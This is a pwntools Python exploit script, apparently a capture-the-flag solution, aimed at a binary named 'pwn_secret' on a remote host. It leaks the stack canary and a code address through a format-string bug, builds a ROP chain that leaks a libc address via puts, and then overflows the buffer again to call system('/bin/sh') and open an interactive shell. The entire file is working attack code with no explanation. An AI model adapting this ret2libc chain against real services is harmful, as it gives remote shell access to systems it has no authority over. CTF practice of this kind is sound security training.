from pwn import *

# p = process('./pwn_secret')
p = remote('34.40.105.109',30865)


binary_path = './pwn_secret'
elf = ELF(binary_path)
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'

p.recvuntil(b'Name: ')
p.sendline(b'%15$p|%21$p') # offset 15 is the canary and offset 19 is the entry addr

p.recvuntil(b'Hillo ')
leaks = p.recvline().strip().decode().split('|')

canary = int(leaks[0], 16)
code_leak = int(leaks[1], 16)
log.success(f"Canary: {hex(canary)}")
log.success(f"Code leak : {hex(code_leak)}")

elf.address = code_leak - 0xb6d # main address
log.success(f"binary base: {hex(elf.address)}")

# 0x0000000000000889 : ret
# 0x0000000000000ca3 : pop rdi ; ret

ret_gadget = 0x0000000000000889
pop_rdi_ret_gadget = 0x0000000000000ca3

ret_addr = elf.address + ret_gadget
pop_rdi_ret = elf.address + pop_rdi_ret_gadget

puts_got = p64(elf.got['puts'])
puts_plt = p64(elf.plt['puts'])
start_addr = p64(elf.symbols['_start'])

payload = b'a' * 136 # reach canary
payload += p64(canary) # keep intact
payload += b'b' * 8 # fill rbp
# jumping jack flash
payload += p64(pop_rdi_ret)
payload += puts_got
payload += puts_plt
payload += start_addr

p.recvuntil(b'Phrase: ')
p.sendline(payload)

p.recvuntil(b'Entered strings are not same!\n')

try:
    leak_data = p.recvline().strip()
    # Sometimes puts outputs 6 bytes, sometimes padded.
    # We unpack it carefully.
    leak_puts = u64(leak_data.ljust(8, b'\x00'))
    log.success(f"Leaked puts@GLIBC: {hex(leak_puts)}")
except:
    log.error("Failed to receive leak. Check offsets.")

# now let's fuzz the libc version, we will try different offsets based on the puts termination e50, searching in libc database

puts_offset = 0x6f690

libc_base_address = leak_puts - puts_offset

system_offset = 0x45390
str_bin_sh_offset = 0x18cd57

system_address = libc_base_address + system_offset
str_bin_sh_address = libc_base_address + str_bin_sh_offset

p.recvuntil(b'Name: ')
p.sendline("you are pwned!")

p.recvuntil(b'Hillo ')
p.recvuntil(b'Phrase: ')

payload = b'a' * 136 # reach canary again
payload += p64(canary)
payload += b'b' * 8 # rbp
# jump again, but this time in libc
payload += p64(ret_addr)
payload += p64(pop_rdi_ret)
payload += p64(str_bin_sh_address)
payload += p64(system_address)

p.sendline(payload)

p.interactive()